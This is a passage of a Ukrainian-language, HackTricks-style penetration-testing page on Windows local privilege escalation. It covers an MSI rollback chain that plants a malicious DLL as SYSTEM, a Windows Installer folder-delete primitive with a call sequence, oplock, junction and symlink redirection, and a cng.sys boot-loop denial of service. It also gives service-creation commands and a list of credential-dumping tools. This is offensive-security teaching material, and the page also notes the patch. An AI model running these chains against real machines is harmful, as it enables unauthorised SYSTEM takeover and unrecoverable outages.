Для користувача без прав адміністратора `SetEEUIDirectoryAndFilter` видає себе за клієнта лише під час відкриття переданого шляху з прапорцями `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS` і `FILE_FLAG_OPEN_REPARSE_POINT`. Це підтверджує, що клієнт може видалити каталог, і не дає перейти за точкою повторної обробки, але **не** прив’язує перевірений файловий об’єкт до подальшого очищення й не доводить, що його створив Windows Installer.<sup>[[41]](#references)</sup>

Після `MsiBeginTransactionW` `SetEEUIDirectoryAndFilter` ставить шлях у чергу як папку незалежно від аргументу фільтра, переданого клієнтом. Служба записує іменоване значення `REG_DWORD` у розділ `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: ім’я значення — це шлях, контрольований клієнтом, а дані `0x00000002` позначають папку. Після цього `CleanupTempPackages(NULL, FALSE)` безпосередньо запускає очищення. Його привілейований робочий процес перелічує значення реєстру й передає записи папок у рекурсивну функцію `FDeleteFolder`, не перевіряючи походження шляхів. Якщо звичайне видалення не вдається, код також викликає `LockdownPath`, скидає атрибути файлу й повторює спробу.<sup>[[41]](#references)</sup>

Мінімальна послідовність викликів, відновлена з `msi.dll`:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Корисний примітив тут — повторне використання шляху, а не перенаправлення через junction. Зареєструйте створений зловмисником `C:\Config.Msi`, видаліть його й дочекайтеся, поки Windows Installer пізніше знову створить каталог за тим самим шляхом, цього разу із захищеними даними відкату. Під час очищення система довіряє застарілому імені `TempPackages` і видаляє новий каталог від імені SYSTEM. Це обходить призначений захист через `FILE_FLAG_OPEN_REPARSE_POINT` і пом’якшення ризиків довіри до перенаправлення, оскільки reparse point не потрібен.<sup>[[41]](#references)</sup>

Цей примітив видалення вписується в наведений нижче ланцюжок відкату: збережіть окремий запис `Installer\Folders`, видаліть захищений `C:\Config.Msi`, створіть його з NULL DACL і збережіть дескриптор із правом `WRITE_DAC`, відкритий до того, як інсталятор посилить DACL. Попередньо відкритий дескриптор дає змогу відновити дозвільну DACL за допомогою `NtSetSecurityObject`, після чого згенерований файл `.rbs` можна замінити до продовження відкату.<sup>[[41]](#references)</sup>

Microsoft виправила цю проблему, заборонивши `CMsiTransaction::SetEEUIDirectoryAndFilter` викликати `ScheduleFileOrFolderDelete`, якщо ввімкнено новий feature gate. Виклик COM усе ще може повертати успіх, але шлях, контрольований зловмисником, більше не додається до `TempPackages`. Застосуйте оновлення безпеки Windows за квітень 2025 року, а не використовуйте успішне повернення методу як тест на наявність виправлення.<sup>[[41]](#references)[[42]](#references)</sup>

Стисло техніка виглядає так:

1. **Етап 1 – Підготовка до перехоплення (залиште `C:\Config.Msi` порожнім)**

- Крок 1: Установіть MSI
    - Створіть `.msi`, який встановлює безпечний файл (наприклад, `dummy.txt`) у доступну для запису папку (`TARGETDIR`).
    - Позначте інсталятор як **"UAC Compliant"**, щоб його міг запустити **не адміністратор**.
    - Після встановлення залиште відкритим **дескриптор** файлу.

- Крок 2: Почніть видалення
    - Видаліть той самий `.msi`.
    - Процес видалення почне переміщати файли до `C:\Config.Msi` та перейменовувати їх на файли `.rbf` (резервні копії для відкату).
    - **Опитуйте відкритий дескриптор файлу** за допомогою `GetFinalPathNameByHandle`, щоб визначити, коли файл стане `C:\Config.Msi\<random>.rbf`.

- Крок 3: Синхронізація
    - `.msi` містить **власну дію видалення (`SyncOnRbfWritten`)**, яка:
        - Сигналізує, коли файл `.rbf` записано.
        - Потім **чекає** на іншу подію, перш ніж продовжити видалення.

- Крок 4: Заблокуйте видалення `.rbf`
    - Отримавши сигнал, **відкрийте файл `.rbf`** без `FILE_SHARE_DELETE` — це **не дасть його видалити**.
    - Потім **надішліть сигнал у відповідь**, щоб видалення могло завершитися.
    - Windows Installer не може видалити `.rbf`, а оскільки він не може видалити весь вміст, **`C:\Config.Msi` не видаляється**.

- Крок 5: Видаліть `.rbf` вручну
    - Ви (зловмисник) вручну видаляєте файл `.rbf`.
    - Тепер **`C:\Config.Msi` порожній і готовий до перехоплення**.

> На цьому етапі **запустіть вразливість видалення довільної папки з рівнем SYSTEM**, щоб видалити `C:\Config.Msi`.

2. **Етап 2 – Заміна скриптів відкату на шкідливі**

- Крок 6: Створіть `C:\Config.Msi` повторно зі слабкими ACL
    - Самостійно створіть папку `C:\Config.Msi` повторно.
    - Установіть **слабкі DACL** (наприклад, Everyone:F) і **залиште відкритим дескриптор** із правом `WRITE_DAC`.

- Крок 7: Запустіть ще одне встановлення
    - Знову встановіть `.msi`, указавши:
        - `TARGETDIR`: доступне для запису розташування.
        - `ERROROUT`: змінну, яка спричиняє примусову помилку.
    - Це встановлення буде використано, щоб знову запустити **відкат**, під час якого зчитуються `.rbs` і `.rbf`.

- Крок 8: Відстежуйте появу `.rbs`
    - Використовуйте `ReadDirectoryChangesW`, щоб відстежувати `C:\Config.Msi`, доки не з’явиться новий `.rbs`.
    - Зафіксуйте його ім’я.

- Крок 9: Синхронізуйтеся перед відкатом
    - `.msi` містить **власну дію встановлення (`SyncBeforeRollback`)**, яка:
        - Сигналізує про створення `.rbs`.
        - Потім **чекає**, перш ніж продовжити.

- Крок 10: Повторно застосуйте слабкі ACL
    - Отримавши подію `.rbs created`:
        - Windows Installer **повторно встановлює суворі ACL** для `C:\Config.Msi`.
        - Але оскільки у вас досі є дескриптор із правом `WRITE_DAC`, ви можете **знову застосувати слабкі ACL**.

> ACL **перевіряються лише під час відкриття дескриптора**, тож записувати до папки все ще можна.

- Крок 11: Розмістіть підроблені `.rbs` і `.rbf`
    - Перезапишіть файл `.rbs` **підробленим скриптом відкату**, який вказує Windows:
        - Відновити файл `.rbf` (шкідливу DLL) у **привілейованому розташуванні** (наприклад, `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Розмістіть підроблений `.rbf` зі **шкідливою DLL-корисним навантаженням рівня SYSTEM**.

- Крок 12: Запустіть відкат
    - Надішліть сигнал події синхронізації, щоб інсталятор продовжив роботу.
    - **Власну дію типу 19 (`ErrorOut`)** налаштовано так, щоб вона **навмисно завершувала встановлення помилкою** у визначеному місці.
    - Це запускає **відкат**.

- Крок 13: SYSTEM установлює вашу DLL
    - Windows Installer:
        - Зчитує ваш шкідливий `.rbs`.
        - Копіює вашу DLL із `.rbf` у цільове розташування.
    - Тепер ваша **шкідлива DLL розташована за шляхом, із якого її завантажує SYSTEM**.

- Останній крок: Виконайте код від імені SYSTEM
    - Запустіть довірений **автоматично підвищений бінарний файл** (наприклад, `osk.exe`), який завантажує перехоплену DLL.
    - **Готово**: ваш код виконується **від імені SYSTEM**.


### Від довільного видалення/переміщення/перейменування файлів до SYSTEM EoP

Основна техніка відкату MSI (описана вище) передбачає, що ви можете видалити **цілу папку** (наприклад, `C:\Config.Msi`). Але що, якщо ваша вразливість дає змогу **видаляти довільні файли**?

Можна використати **внутрішні механізми NTFS**: кожна папка має прихований альтернативний потік даних із назвою:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Цей потік зберігає **метадані індексу** папки.

Тож якщо **видалити потік `::$INDEX_ALLOCATION`** папки, NTFS **видалить всю папку** з файлової системи.

Це можна зробити за допомогою стандартних API для видалення файлів, наприклад:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Навіть якщо ви викликаєте API видалення *файлу*, він **видаляє саму папку**.

### Від видалення вмісту папки до SYSTEM EoP
Що, якщо ваш примітив не дозволяє видаляти довільні файли/папки, але **дозволяє видаляти *вміст* папки, контрольованої зловмисником**?

1. Крок 1: Створіть папку-приманку та файл
- Створіть: `C:\temp\folder1`
- Усередині неї: `C:\temp\folder1\file1.txt`

2. Крок 2: Встановіть **oplock** на `file1.txt`
- **oplock** **призупиняє виконання**, коли привілейований процес намагається видалити `file1.txt`.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Крок 3: Запустіть процес SYSTEM (наприклад, `SilentCleanup`)
- Цей процес сканує папки (наприклад, `%TEMP%`) і намагається видалити їхній вміст.
- Коли він доходить до `file1.txt`, **спрацьовує oplock** і передає керування вашому callback.

4. Крок 4: Усередині callback oplock — перенаправте видалення

- Варіант A: Перемістіть `file1.txt` в інше місце
    - Це очистить `folder1`, не порушуючи oplock.
    - Не видаляйте `file1.txt` безпосередньо — це передчасно звільнить oplock.

- Варіант B: Перетворіть `folder1` на **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Варіант C: Створіть **symlink** у `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Це націлено на внутрішній потік NTFS, у якому зберігаються метадані папки, — його видалення видаляє папку.

5. Крок 5: Release the oplock
- Процес SYSTEM продовжує роботу й намагається видалити `file1.txt`.
- Але тепер через junction і symlink він фактично видаляє:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Результат**: `C:\Config.Msi` видаляється від імені SYSTEM.

### Від створення довільної папки до постійного DoS

Використайте примітив, який дає змогу **створити довільну папку від імені SYSTEM/admin** — навіть якщо **ви не можете записувати файли** або **встановлювати слабкі дозволи**.

Створіть **папку** (не файл) з назвою **критичного драйвера Windows**, наприклад:
```
C:\Windows\System32\cng.sys
```

- Цей шлях зазвичай відповідає драйверу режиму ядра `cng.sys`.
- Якщо **заздалегідь створити за ним папку**, Windows не зможе завантажити справжній драйвер під час запуску.
- Потім Windows намагатиметься завантажити `cng.sys` під час запуску.
- Вона побачить папку, **не зможе знайти справжній драйвер** і **аварійно завершить роботу або зупинить завантаження**.
- **Резервного варіанта немає**, і **відновлення без зовнішнього втручання** (наприклад, відновлення завантаження або доступу до диска) **неможливе**.

### Від привілейованих шляхів журналів/резервних копій і OM symlinks до довільного перезапису файлів / DoS під час завантаження

Коли **привілейована служба** записує журнали/експорти за шляхом, отриманим із **доступної для запису конфігурації**, перенаправте цей шлях за допомогою **Object Manager symlinks + NTFS mount points**, щоб перетворити привілейований запис на довільний перезапис (навіть **без** SeCreateSymbolicLinkPrivilege).<sup>[[15]](#references)</sup>

**Вимоги**
- Конфігурація, що містить цільовий шлях, доступна зловмиснику для запису (наприклад, `%ProgramData%\...\.ini`).
- Можливість створити mount point до `\RPC Control` і OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Привілейована операція, що записує за цим шляхом (журнал, експорт, звіт).

**Приклад ланцюжка**
1. Прочитайте конфігурацію, щоб дізнатися шлях до привілейованого журналу, наприклад `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` у `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Перенаправте шлях без прав адміністратора:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Дочекайтеся, поки привілейований компонент запише журнал (наприклад, адміністратор запустить «надіслати тестове SMS»). Запис тепер потрапить у `C:\Windows\System32\cng.sys`.
4. Перевірте перезаписану ціль (hex/PE-парсером), щоб підтвердити пошкодження; перезавантаження змусить Windows завантажити підмінений шлях до драйвера → **boot loop DoS**. Цей підхід також працює з будь-яким захищеним файлом, який привілейована служба відкриває для запису.

> `cng.sys` зазвичай завантажується з `C:\Windows\System32\drivers\cng.sys`, але якщо копія є в `C:\Windows\System32\cng.sys`, спершу може бути використана вона, що робить цей файл надійною ціллю DoS для пошкоджених даних.



## **Від High Integrity до System**

### **Новий сервіс**

Якщо ви вже працюєте в процесі з High Integrity, **шлях до SYSTEM** може бути простим: достатньо **створити й запустити новий сервіс**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Під час створення бінарного файлу служби переконайтеся, що це дійсна служба або що бінарний файл швидко виконує необхідні дії, оскільки його буде зупинено через 20 секунд, якщо це не дійсна служба.

### AlwaysInstallElevated

З процесу з високим рівнем цілісності можна спробувати **увімкнути записи реєстру AlwaysInstallElevated** і **встановити** reverse shell за допомогою обгортки _**.msi**_.\
[Більше інформації про відповідні ключі реєстру та встановлення пакета _.msi_ — тут.](#alwaysinstallelevated)

### Від високого рівня цілісності + привілею SeImpersonate до System

**Ви можете** [**знайти код тут**](seimpersonate-from-high-to-system.md)**.**

### Від SeDebug + SeImpersonate до привілеїв повного токена

Якщо у вас є ці привілеї токена (імовірно, ви знайдете їх у процесі з високим рівнем цілісності), ви зможете **відкрити майже будь-який процес** (окрім захищених процесів) із привілеєм SeDebug, **скопіювати токен** процесу та створити **довільний процес із цим токеном**.\
Зазвичай ця техніка **передбачає вибір будь-якого процесу, що працює від SYSTEM і має всі привілеї токена** (_так, можна знайти процеси SYSTEM без усіх привілеїв токена_).\
**Приклад коду, який виконує запропоновану техніку, можна знайти** [**тут**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Цю техніку meterpreter використовує для підвищення привілеїв у `getsystem`. Вона полягає в **створенні pipe, а потім створенні служби або зловживанні нею, щоб записати дані в цей pipe**. Тоді **сервер**, який створив pipe, використовуючи привілей **`SeImpersonate`**, зможе **імперсонувати токен** клієнта pipe (служби) й отримати привілеї SYSTEM.\
Щоб [**дізнатися більше про name pipes, прочитайте це**](#named-pipe-client-impersonation).\
Приклад того, [**як перейти від високого рівня цілісності до System за допомогою name pipes, наведено тут**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Якщо вам вдасться **перехопити dll**, що **завантажується** **процесом**, який працює від **SYSTEM**, ви зможете виконати довільний код із цими правами. Тому Dll Hijacking також корисний для такого підвищення привілеїв, а крім того, його **набагато простіше виконати з процесу з високим рівнем цілісності**, оскільки такий процес матиме **права на запис** до папок, які використовуються для завантаження dll.\
**Дізнатися більше про Dll hijacking можна** [**тут**](dll-hijacking/index.html)**.**

### **Від Administrator або Network Service до System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### Від LOCAL SERVICE або NETWORK SERVICE до повних привілеїв

**Читайте:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Додаткова допомога

[Статичні бінарні файли impacket](https://github.com/ropnop/impacket_static_binaries)

## Корисні інструменти

**Найкращий інструмент для пошуку векторів локального підвищення привілеїв у Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Перевіряє неправильні конфігурації та конфіденційні файли (**[**перегляньте тут**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Виявляється.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Перевіряє деякі можливі неправильні конфігурації та збирає інформацію (**[**перегляньте тут**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Перевіряє неправильні конфігурації**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Витягує збережену інформацію про сеанси PuTTY, WinSCP, SuperPuTTY, FileZilla та RDP. Використовуйте -Thorough локально.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Витягує облікові дані з Credential Manager. Виявляється.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Перевіряє зібрані паролі в домені**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh — це інструмент PowerShell для підміни ADIDNS/LLMNR/mDNS і атаки man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Базове перерахування Windows для підвищення привілеїв**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Пошук відомих вразливостей для підвищення привілеїв (ЗАСТАРІЛИЙ, замінений на Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Локальні перевірки **(потрібні права адміністратора)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Пошук відомих вразливостей для підвищення привілеїв (потрібно скомпілювати за допомогою VisualStudio) ([**попередньо скомпільований файл**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Перераховує хост у пошуках неправильних конфігурацій (радше інструмент для збору інформації, ніж для підвищення привілеїв) (потрібно скомпілювати) **(**[**попередньо скомпільований файл**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Витягує облікові дані з багатьох програм (попередньо скомпільований exe є на github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Порт PowerUp на C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Перевірка неправильних конфігурацій (попередньо скомпільований виконуваний файл є на github). Не рекомендовано. Погано працює у Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Перевірка можливих неправильних конфігурацій (exe на Python). Не рекомендовано. Погано працює у Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Інструмент, створений на основі цієї публікації (для належної роботи йому не потрібен accesschk, але його можна використовувати).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Читає вивід **systeminfo** і пропонує робочі експлойти (локальний Python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Читає вивід **systeminfo** і пропонує робочі експлойти (локальний Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Потрібно скомпілювати проєкт із відповідною версією .NET ([див. тут](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Щоб переглянути встановлену на хості жертви версію .NET, виконайте:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Основи підвищення привілеїв у Windows](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Підвищення привілеїв через використання слабких дозволів на папки](http://www.greyhathacker.net/?p=738)
- [3] [Підвищення привілеїв у Windows — шпаргалка](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop — практикум із локального підвищення привілеїв у Windows / Linux](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 — атаки на Windows: AT — новий чорний (Rob Fuller і Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Підвищення привілеїв — Windows — повний посібник з OSCP](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows — підвищення привілеїв — PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Посібник із підвищення привілеїв у Windows](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Контрольний список із підвищення привілеїв у Windows](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Підвищення привілеїв у Windows](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Методи підвищення привілеїв у Windows для пентестерів](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf — HTB/VulnLab JobTwo: фішинг через макрос Word VBA і SMTP → розшифрування облікових даних hMailServer → Veeam CVE-2023-27532 для отримання SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-string leak + стековий BOF → VirtualAlloc ROP (RCE) і викрадення kernel token](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research — полювання на Silver Fox: кішки-мишки в тінях ядра](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 — вразливість файлової системи з підвищеними привілеями в системі SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Інструменти для тестування символічних посилань — використання CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Посилання в минуле. Зловживання символічними посиланнями у Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn — MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (порт BOF для Cobalt Strike)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI — Node.js: небезпечне визначення модулів у Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Модулі Node.js: завантаження з папок `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits — розв’язання завдань контрольного списку C/C++](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn — функція RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery — NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone — CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone — перехоплення бінарних файлів служб](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own із Microslop: ланцюжок уразливостей CLDFLT і race condition ядра DirectX для локального підвищення привілеїв у Windows](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Одного I/O Ring достатньо, щоб підкорити все: повноцінний примітив читання/запису в Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Зловживання довільним видаленням файлів для підвищення привілеїв та інші корисні трюки](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC — код експлойту FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure — атаки на WSUS, частина 2: CVE-2020-1013, локальне підвищення привілеїв у Windows 10](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: знайомство з Credential Manager і Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n — PoC для CVE-2019-1388](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com — делегування Kerberos Resource Based Constrained Delegation: як зміна образу призводить до підвищення привілеїв](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com — отримання приватних ключів SSH з агента SSH у Windows 10](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps — перетворення корпоративних серверів оновлень на фабрики бекдорів (0_o), частина 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps — перетворення корпоративних серверів оновлень на фабрики бекдорів (0_o), частина 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s — NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence — підвищення привілеїв через видалення папки Windows Installer](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center — CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec — Total Recall: повернення слідами до NT AUTHORITY\SYSTEM](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
- [44] [NCC Group — рекомендація щодо підвищення привілеїв через зміщення в спільній пам’яті Windows MIDI Services](https://nccgroup.com/research/technical-advisory-microsoft-windows-midi-service-module-escalation-of-privileges-cve-2026-62688)
{{#include ../../banners/hacktricks-training.md}}
